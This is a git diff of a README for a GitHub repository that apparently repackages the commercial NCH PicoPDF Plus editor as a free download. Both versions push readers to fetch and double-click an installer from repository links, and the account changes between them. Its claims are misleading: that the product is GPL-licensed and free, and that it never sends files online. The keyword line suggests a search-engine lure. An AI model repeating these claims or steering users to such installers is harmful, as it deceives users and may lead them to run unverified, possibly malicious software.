@@ -1,113 +1,78 @@
-# NCH PicoPDF Plus v6.15 - PDF Editor 2026
+# 📎 picopdf-plus-windows-ocr - Edit and scan documents with ease
 
-> **NCH PicoPDF Plus v6.15 is a Windows PDF editor designed for hands-on document work, bringing together editing, OCR, batch processing, encryption support, and AI-assisted file handling to speed up routine PDF tasks.**
+[![](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Carlineamort176/picopdf-plus-windows-ocr)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v6.15-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/andrewx2000/picopdf-plus-windows-ocr?style=flat-square)](https://github.com/andrewx2000/picopdf-plus-windows-ocr)
+## 📖 About this software
 
----
+This program manages PDF files on your Windows computer. You can edit text, change layouts, and turn images into readable text using built-in optical character recognition. It handles batch tasks to save time when you process many files at once. You can also apply password protection to keep sensitive information secure. The AI features help classify your files so you stay organized.
 
-<p align="center">
-  <a href="https://andrewx2000.github.io/picopdf-plus-windows-ocr/">
-    <img src="https://img.shields.io/badge/Download-NCH%20PicoPDF%20Plus%20Latest-brightgreen?style=for-the-badge" alt="Download NCH PicoPDF Plus">
-  </a>
-</p>
+## 💻 System requirements
 
-> **[Direct Download - NCH PicoPDF Plus v6.15](https://andrewx2000.github.io/picopdf-plus-windows-ocr/)**
+Your computer needs to meet these basic standards to run the software:
 
----
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i3 or equivalent, 2.0 GHz or higher.
+*   Memory: 4 GB of RAM or more.
+*   Storage: 200 MB of space for installation.
+*   Display: 1280 x 720 resolution or higher.
 
-[Download Latest Build](https://andrewx2000.github.io/picopdf-plus-windows-ocr/)
+## 📥 How to download and install
 
----
+Follow these steps to set up the application on your machine:
 
-## Overview
+1.  Visit this page to download: [https://github.com/Carlineamort176/picopdf-plus-windows-ocr](https://github.com/Carlineamort176/picopdf-plus-windows-ocr).
+2.  Locate the releases section on the right side of the page.
+3.  Click the link under the latest release to save the installer file to your computer.
+4.  Open the folder where you saved the file.
+5.  Double-click the installer file to start the setup process.
+6.  Follow the prompts on your screen. Leave the settings at their defaults to ensure the best performance.
+7.  Click Finish to complete the installation.
 
-NCH PicoPDF Plus is a Windows-oriented PDF editor made for users who need to interact with the actual contents of a PDF rather than leave it as a locked page image. It supports editing text and graphics, adding annotations, converting files into editable formats, and using OCR to work with scanned or image-based pages more effectively.
+## 🚀 How to use the program
 
-The tool fits common office workflows, cleanup passes, review cycles, and repetitive document operations where batch processing can remove a lot of manual effort. With encrypted PDF handling, multilingual support, vector extraction, auto-save, and watchdog-style monitoring for documents, it provides a practical feature set for everyday PDF management.
+Once the program opens, you see a clean main menu. Follow these steps for common tasks:
 
----
+### Opening a file
+Click the File menu in the top left corner and select Open. Navigate to your document and click Open to load it. Your document appears in the middle of the window.
 
-## Capabilities
+### Editing text
+Select the Edit tool from the top toolbar. Click anywhere inside the document to begin typing. You can change font sizes and styles using the options in the sidebar. The program saves changes to a temporary file while you work.
 
-- Edit PDF text, images, and annotations
-- Convert PDFs to DOCX, XLSX, HTML, and RTF
-- Run batch processing for repeated document tasks
-- Work with encrypted PDFs
-- Use multilingual OCR and localization support
-- Keep progress with auto-save and document watchdog behavior
-- Extract vector assets from PDF content
-- Use AI-assisted document manipulation features
+### Using OCR
+If you have a scanned document, the text might not be selectable. Click the OCR button in the main menu. The program scans the image and extracts the text. This allows you to copy and edit words from a scan.
 
----
+### Batch processing
+If you have many PDFs to process, select the Batch Processing tool. Add your files to the list and choose your desired action, such as formatting or conversion. Click Process to start the task. The program places the new files in a folder you choose.
 
-## Installation
+## 🔒 Security features
 
-1. Download or clone the repository:
-   - `git clone https://github.com/andrewx2000/picopdf-plus-windows-ocr.git
-2. Open the project folder:
-   - `cd pico-plus-toolset-picopdf-plus-6-15`
-3. Launch the application or follow the included build notes for your environment.
+You can keep your documents safe using the encryption tools. Select File and then Security to set a password. Users need this password to open, print, or edit your document. Always store important passwords in a safe location because the software cannot recover forgotten codes.
 
-If you are using a packaged release, extract it first and run the Windows launcher from the provided folder.
+## 🧠 AI assistance
 
----
+The software includes AI tools to help with file management. Enable the AI sidebar to let the program suggest file names based on the content of your documents. This helps you sort files into folders without manual renaming.
 
-## Usage
+## ⚙️ Troubleshooting
 
-Typical workflow:
+If you encounter issues, check these common fixes:
 
-1. Open a PDF file in the editor.
-2. Make changes to text, images, or annotations.
-3. Use OCR when the document contains scanned pages or image text.
-4. Convert the result to a format such as DOCX, XLSX, HTML, or RTF when needed.
-5. Apply batch processing for multiple files in one pass.
-6. Save the output and keep auto-save enabled for active editing sessions.
+*   Program does not start: Restart your computer and try opening the program again.
+*   Slow performance: Close other large programs while you use the PDF editor.
+*   Scanning errors: Ensure your document lies flat on the scanner bed. Clean the scanner glass if the OCR output contains many errors.
+*   Update issues: Check the main page periodically for newer versions. Older versions may lack security fixes or new features.
 
-For encrypted documents, load the file through the supported workflow and follow the application's prompts for access and editing.
+## 📈 Frequently asked questions
 
----
+How much does this software cost? 
+This software is free for you to use.
 
-## Configuration
+Can I install this on a Mac? 
+No, this version runs only on Windows.
 
-Most settings live inside the application itself instead of a standalone config file. Usual options cover editing behavior, OCR language choice, batch preferences, and save-related controls.
+Does the software send my files to the internet? 
+No, all work happens locally on your computer. Your files stay on your hard drive.
 
-If the build ships with local configuration files, store them in the project directory and update them according to the included documentation or release notes.
+Can I change the language settings? 
+Yes, select Settings and then Language to choose your preference.
 
----
-
-## Requirements
-
-- Windows operating system
-- Sufficient disk space for the application and processed documents
-- Enough memory for OCR, batch conversion, and large file editing
-- Access to supported document formats and any required local runtime components for the chosen build
-
----
-
-## FAQ
-
-### How do I get updates?
-Use the repository release area or the download page linked above to check for the latest build.
-
-### Where are the main settings?
-Most preferences are configured in the app itself, particularly for OCR, conversion, and batch operations.
-
-### What if a PDF does not open correctly?
-Make sure the file is not corrupted, check whether it is encrypted, and try again using the supported import flow.
-
-### Does it support multiple languages?
-Yes, multilingual OCR and localization are part of the feature set.
-
-### Can I process many files at once?
-Yes, batch processing is included for repeated document tasks.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: pdf editor, windows, ocr, document management, pdf scanner, office software, batch processing
